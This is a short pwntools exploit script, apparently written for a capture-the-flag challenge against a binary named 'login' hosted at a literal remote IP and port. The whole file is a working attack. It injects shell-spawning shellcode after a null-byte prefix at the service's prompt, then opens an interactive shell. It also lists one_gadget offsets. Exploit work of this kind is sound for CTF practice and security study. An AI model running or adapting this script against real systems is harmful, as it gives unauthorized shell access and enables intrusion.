from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./login')
else:
    io = remote('210.30.97.133',28082)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3b2e,0xe3b31,0xe3b34]

shellcode = asm(shellcraft.sh())
payload = b'\x00' * 8  + shellcode
#p()
io.sendafter(b">>",payload)


io.interactive()

